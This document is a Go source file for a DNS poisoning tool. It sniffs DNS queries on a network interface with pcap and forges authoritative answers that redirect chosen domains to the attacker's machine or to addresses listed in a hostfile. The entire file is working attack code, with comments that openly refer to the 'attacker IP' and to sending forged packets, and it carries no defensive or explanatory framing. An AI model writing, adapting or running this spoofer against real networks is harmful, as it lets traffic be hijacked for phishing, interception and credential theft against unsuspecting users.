package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type poisonCommandDetails struct {
	device            string
	hostfile          string
	websiteNames      []string
	redirectLocations []string
	promiscuous       bool
	snapshot_len      int32
	bpf_expression    string
	my_ip             string
}

type originalPacketDetails struct {
	SrcMAC  net.HardwareAddr
	DstMAC  net.HardwareAddr
	SrcIP   net.IP
	DstIP   net.IP
	SrcPort layers.UDPPort
	DstPort layers.UDPPort
	id      uint16
}

func main() {

	// Setting the default values for the packet reader
	cDetails := poisonCommandDetails{promiscuous: true, snapshot_len: 65535, hostfile: ""}

	bpf_expr := ""

	// Accessing all the commands received during the command line execution
	commandLineArgs := os.Args[1:]

	for j := 0; j < len(commandLineArgs); j++ {
		var value = commandLineArgs[j]
		switch value {
		case "-i":
			cDetails.device = commandLineArgs[j+1]
			j += 1

		case "-f":
			cDetails.hostfile = commandLineArgs[j+1]
			j += 1
			fileData, fileErr := ioutil.ReadFile(cDetails.hostfile)
			if fileErr != nil {
				log.Fatal("Some error occured while reading the file.")
			}
			cDetails.processFileData(string(fileData))

		default:
			bpf_expr = bpf_expr + " " + value
		}
	}
	if bpf_expr == "" {
		//Default filter expression
		cDetails.bpf_expression = "udp and port 53"
	} else {
		cDetails.bpf_expression = bpf_expr
	}

	//Accessing personal IP(Attacker IP) so as to not spoof itself
	cDetails.my_ip = getMyIp()

	if cDetails.hostfile == "" {
		cDetails.redirectLocations = make([]string, 0)
		cDetails.redirectLocations = append(cDetails.redirectLocations, cDetails.my_ip)
	}

	cDetails.readPackets()
}

func getMyIp() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		fmt.Println("Found error is obtaining personal IP " + err.Error() + "\n")
		return ""
	}

	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return (ipnet.IP.String())
			}
		}
	}
	return ""
}

//Processing the file(if available) to extract the necessary information
func (cDetails *poisonCommandDetails) processFileData(fileData string) {
	fileEntries := strings.Split(fileData, "\n")

	var websiteNames = make([]string, 0) // Using slices
	var redirectLocations = make([]string, 0)

	for _, fileEntry := range fileEntries {
		if fileEntry != "" {
			websiteNames = append(websiteNames, strings.Fields(fileEntry)[1])
			redirectLocations = append(redirectLocations, strings.Fields(fileEntry)[0])
		}
	}
	cDetails.websiteNames = websiteNames
	cDetails.redirectLocations = redirectLocations
	fmt.Println(cDetails.websiteNames)      //Website names to be spoofed
	fmt.Println(cDetails.redirectLocations) // Spoofed IP Addresses
}

//Simple function to check if a string exists in a string array
func contains(s []string, str string) int {
	for index, v := range s {
		if strings.Contains(v, str) {
			return index
		}
	}
	return -1
}

//Initiate live reading of packets on the appropriate interface
func (cDetails poisonCommandDetails) readPackets() {
	var deviceFound bool = false

	var devices []pcap.Interface
	devices, device_err := pcap.FindAllDevs()
	if device_err != nil {
		log.Fatal(device_err)
	}

	if cDetails.device == "" {
		cDetails.device = devices[0].Name
		deviceFound = true
	} else {
		for _, device := range devices {
			if cDetails.device == device.Name {
				deviceFound = true
			}
		}
	}
	if deviceFound == false {
		log.Fatal("dnspoison: ", cDetails.device, ": No such device exists")
	}

	handle, err := pcap.OpenLive(cDetails.device, 1600, true, pcap.BlockForever)
	fmt.Println("listening on ", cDetails.device, " [", cDetails.bpf_expression, "and not src", cDetails.my_ip, "]")
	if err != nil {
		log.Fatal(err)
	}
	cDetails.processPacketData(*handle)
}

func (cDetails poisonCommandDetails) processPacketData(handle pcap.Handle) {

	ogPacket := originalPacketDetails{}

	// Adding BPF filter
	handle.SetBPFFilter(cDetails.bpf_expression)

	packetSource := gopacket.NewPacketSource(&handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		dns := ogPacket.extractPacketInformation(packet, cDetails)

		if dns != nil {
			err := ogPacket.writeDNSPacket(dns, cDetails, &handle)
			if err != nil {
				log.Fatal(err)
			} else {
				fmt.Println("Forged Packet Sent!")
			}
		}
	}
}

//Extracting packet information
func (ogPacket *originalPacketDetails) extractPacketInformation(packet gopacket.Packet, cDetails poisonCommandDetails) *layers.DNS {

	dnsLayer := packet.Layer(layers.LayerTypeDNS)

	if dnsLayer != nil {
		dns, _ := dnsLayer.(*layers.DNS)

		// If it a DNS Response packet, we ignore
		if dns.QR == true {
			return nil
		}

		//IP Layer
		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		if ipLayer != nil {
			ip, _ := ipLayer.(*layers.IPv4)

			// If the DNS packet has any request from the attacker's machine, then ignore since we do not want to spoof ourself
			if strings.Contains(cDetails.my_ip, string(ip.SrcIP)) || (strings.Contains(cDetails.my_ip, string(ip.DstIP))) {
				return nil
			}

			ogPacket.id = ip.Id
			ogPacket.SrcIP = ip.SrcIP
			ogPacket.DstIP = ip.DstIP
		}

		// Ethernet layer
		ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
		if ethernetLayer != nil {

			ethernetPacket, _ := ethernetLayer.(*layers.Ethernet)
			ogPacket.SrcMAC = ethernetPacket.SrcMAC
			ogPacket.DstMAC = ethernetPacket.DstMAC
		}

		//UDP Layer
		udpLayer := packet.Layer(layers.LayerTypeUDP)
		if udpLayer != nil {
			udp, _ := udpLayer.(*layers.UDP)
			ogPacket.SrcPort = udp.SrcPort
			ogPacket.DstPort = udp.DstPort
		}

		ogPacket.displayPacketInformation(dns)
		dns = ogPacket.prepareSpoofedResponse(dns, cDetails)
		return dns
	} else {
		return nil
	}
	// Check for errors
	if err := packet.ErrorLayer(); err != nil {
		fmt.Println("Error decoding some part of the packet:", err)
	}

	return nil

}

func (ogPacket originalPacketDetails) displayPacketInformation(dns *layers.DNS) {

	var finalDisplayString = ""
	finalDisplayString += ogPacket.SrcIP.String() + "." + ogPacket.SrcPort.String() + ">"
	finalDisplayString += ogPacket.DstIP.String() + "." + ogPacket.DstPort.String() + " "
	finalDisplayString += strconv.Itoa(int(ogPacket.id)) + "+ A? "
	for _, dnsQuestion := range dns.Questions {
		finalDisplayString += string(dnsQuestion.Name) + " "
	}
	fmt.Println(finalDisplayString)
}

//Generate spoofed DNS layer response with the attacker IP
func (ogPacket originalPacketDetails) prepareSpoofedResponse(dns *layers.DNS, cDetails poisonCommandDetails) *layers.DNS {

	writePacket := false
	var websiteAtIndex int
	if dns.ANCount == 0 {
		for _, dnsQuestion := range dns.Questions {
			website := string(dnsQuestion.Name)
			var answerRecord layers.DNSResourceRecord
			if cDetails.hostfile != "" {
				websiteAtIndex = contains(cDetails.websiteNames, website)
				if websiteAtIndex == -1 {
					continue
				}
			} else {
				websiteAtIndex = 0 //default
			}
			writePacket = true
			spoofedIp := net.ParseIP(cDetails.redirectLocations[websiteAtIndex])
			// fmt.Print("Spoofed IP: ", spoofedIp)

			answerRecord.IP = spoofedIp
			dns.ANCount += 1

			answerRecord.Type = layers.DNSTypeA
			answerRecord.Name = []byte(dnsQuestion.Name)
			answerRecord.Class = layers.DNSClassIN
			dns.QR = true
			dns.OpCode = layers.DNSOpCodeNotify
			dns.AA = true
			dns.Answers = append(dns.Answers, answerRecord)
			dns.ResponseCode = layers.DNSResponseCodeNoErr
		}
	}
	if writePacket {
		return dns
	} else {
		return nil
	}
}

//Preparing forged packet and transmitting it
func (ogPacket originalPacketDetails) writeDNSPacket(dns *layers.DNS, cDetails poisonCommandDetails, handle *pcap.Handle) error {
	// Set up all the layers' fields we can.
	eth := layers.Ethernet{
		SrcMAC:       ogPacket.DstMAC,
		DstMAC:       ogPacket.SrcMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}

	ip := layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    ogPacket.DstIP,
		DstIP:    ogPacket.SrcIP,
		Protocol: layers.IPProtocolUDP,
	}

	udp := layers.UDP{
		SrcPort: ogPacket.DstPort,
		DstPort: ogPacket.SrcPort,
	}
	udp.SetNetworkLayerForChecksum(&ip)

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	gopacket.SerializeLayers(buf, opts, &eth, &ip, &udp, &*dns)
	finalPacket := buf.Bytes()
	if err := handle.WritePacketData(finalPacket); err != nil {
		return err
	}
	return nil
}
